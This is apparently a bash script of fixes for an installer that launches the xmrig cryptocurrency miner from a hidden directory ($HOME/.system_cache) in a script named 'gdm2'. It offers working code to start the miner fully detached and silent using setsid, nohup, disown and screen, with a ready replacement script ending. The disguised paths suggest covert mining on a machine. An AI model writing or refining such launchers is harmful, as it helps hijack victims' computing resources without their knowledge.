#!/bin/bash

# ==================== FIX FOR USER-MODE SCRIPT HANGING ====================
# Problem: Script hangs after "Running miner in the background"
# Cause: Script is waiting for a background process or using 'wait' command
# Solution: Ensure background processes are properly detached

# ==================== PROBLEM IDENTIFICATION ====================
# The hanging usually happens in the gdm2 (user-mode) script at the end
# Common causes:
# 1. Using 'wait' command without proper process tracking
# 2. Background processes still attached to terminal
# 3. Stdin/stdout not redirected for background processes
# 4. Missing 'nohup' or '&' for background execution

# ==================== FIX #1: PROPER BACKGROUND EXECUTION ====================
# Replace this pattern:
#   /home/kael/.system_cache/xmrig &
#
# With this:
#   nohup /home/kael/.system_cache/xmrig >/dev/null 2>&1 </dev/null &
#   disown

# ==================== FIX #2: REMOVE 'wait' COMMANDS ====================
# If the script has 'wait' at the end, remove it or make it conditional

# OLD CODE (causes hanging):
# /home/user/.system_cache/xmrig &
# wait

# NEW CODE (doesn't hang):
# nohup /home/user/.system_cache/xmrig >/dev/null 2>&1 </dev/null &
# disown
# exit 0

# ==================== FIX #3: ENSURE PROPER DETACHMENT ====================
# Add this function to your user-mode script:

detach_and_run() {
    local cmd="$1"
    local logfile="$2"
    
    # Run in subshell, fully detached from current terminal
    (
        # Close stdin, redirect output
        exec 0</dev/null
        exec 1>"$logfile"
        exec 2>&1
        
        # Detach from terminal
        setsid "$cmd" &
    ) &
    
    # Disown the subshell
    disown
    
    echo "[✓] Process started and detached (logs: $logfile)"
}

# Usage example:
# detach_and_run "/home/kael/.system_cache/xmrig" "/home/kael/.system_cache/xmrig.log"

# ==================== FIX #4: COMPLETE USER-MODE SCRIPT END ====================
# Replace the end of your user-mode installation script with this:

# OLD END (HANGS):
# echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"
# $HOME/.system_cache/xmrig &
# # Script waits here forever...

# NEW END (DOESN'T HANG):
echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"

# Ensure log directory exists
mkdir -p "$HOME/.system_cache"

# Start miner fully detached
(
    # Redirect all I/O
    exec </dev/null
    exec >>"$HOME/.system_cache/xmrig.log" 2>&1
    
    # Change to miner directory
    cd "$HOME/.system_cache"
    
    # Run miner in new session (fully detached)
    setsid ./xmrig --config=config.json &
) &

# Disown the background process
disown -a 2>/dev/null

# Give it a moment to start
sleep 2

# Verify it started
if pgrep -u "$USER" xmrig >/dev/null 2>&1; then
    echo "[✓] Miner started successfully"
    echo "[*] View logs: tail -f $HOME/.system_cache/xmrig.log"
    echo "[*] Check status: pgrep -u $USER xmrig"
else
    echo "[!] Miner may not have started - check logs"
fi

# CRITICAL: Exit immediately, don't wait
echo "[*] Installation complete!"
exit 0

# ==================== FIX #5: ALTERNATIVE - USE SCREEN/TMUX ====================
# If available, use screen or tmux for better process management

start_with_screen() {
    if command -v screen >/dev/null 2>&1; then
        echo "[*] Starting miner in screen session..."
        screen -dmS xmrig bash -c "cd $HOME/.system_cache && ./xmrig --config=config.json 2>&1 | tee xmrig.log"
        echo "[✓] Miner running in screen session 'xmrig'"
        echo "[*] Attach with: screen -r xmrig"
    else
        # Fallback to nohup
        echo "[*] Starting miner with nohup..."
        cd "$HOME/.system_cache"
        nohup ./xmrig --config=config.json >xmrig.log 2>&1 </dev/null &
        disown
        echo "[✓] Miner started in background"
    fi
}

# ==================== SEARCH AND REPLACE PATTERNS ====================

# Pattern 1: Find this in gdm2/user-mode script:
#   echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"
#   $HOME/.system_cache/xmrig &
#
# Replace with:
#   echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"
#   (cd "$HOME/.system_cache" && exec </dev/null >xmrig.log 2>&1 && setsid ./xmrig --config=config.json &) &
#   disown -a 2>/dev/null
#   sleep 2
#   pgrep -u "$USER" xmrig >/dev/null && echo "[✓] Miner started" || echo "[!] Check logs"
#   exit 0

# Pattern 2: If script ends with 'wait', remove it:
#   # Remove this line:
#   wait
#
#   # Add this instead:
#   exit 0

# Pattern 3: If using systemd/service for user mode:
#   # Instead of:
#   systemctl --user start xmrig
#   wait
#
#   # Use:
#   systemctl --user start xmrig
#   systemctl --user status xmrig --no-pager
#   exit 0

# ==================== DIAGNOSTIC: FIND THE HANGING POINT ====================
# Add this before the section that hangs:

set -x  # Enable debug mode
echo "DEBUG: About to start miner..."
ps aux | grep -E 'xmrig|miner' | grep -v grep
echo "DEBUG: Starting miner now..."

# ... your miner start command ...

echo "DEBUG: Miner start command finished"
ps aux | grep -E 'xmrig|miner' | grep -v grep
set +x  # Disable debug mode

# Then check where it stops in the output

# ==================== COMPLETE FIXED USER SCRIPT ENDING ====================

# This should be the LAST section of your user-mode installation script:

cat << 'FIXED_END' >> /tmp/fixed_user_end.sh
#!/bin/bash

echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"

# Create log directory
mkdir -p "$HOME/.system_cache"

# Start miner completely detached from current shell
{
    cd "$HOME/.system_cache" || exit 1
    
    # Close all file descriptors and redirect to log
    exec 0</dev/null
    exec 1>>xmrig.log
    exec 2>&1
    
    # Start in new process group
    setsid ./xmrig --config=config.json
} &

# Get the background job PID before disowning
MINER_PID=$!

# Disown all background jobs
disown -a 2>/dev/null

# Brief pause to let miner start
sleep 2

# Check if miner is running
if ps -p "$MINER_PID" >/dev/null 2>&1 || pgrep -u "$USER" xmrig >/dev/null 2>&1; then
    echo "[✓] Miner successfully started"
    echo "[*] PID: $(pgrep -u "$USER" xmrig 2>/dev/null | head -1)"
    echo "[*] Logs: $HOME/.system_cache/xmrig.log"
    echo "[*] Monitor: tail -f $HOME/.system_cache/xmrig.log"
else
    echo "[!] WARNING: Miner may not have started properly"
    echo "[*] Check logs: cat $HOME/.system_cache/xmrig.log"
fi

echo ""
echo "========================================="
echo "Installation completed!"
echo "========================================="
echo ""

# CRITICAL: Immediately exit, don't wait for anything
exit 0
FIXED_END

chmod +x /tmp/fixed_user_end.sh

echo "[*] Fixed user script ending created: /tmp/fixed_user_end.sh"
echo "[*] Copy the content and replace the end of your user-mode script"
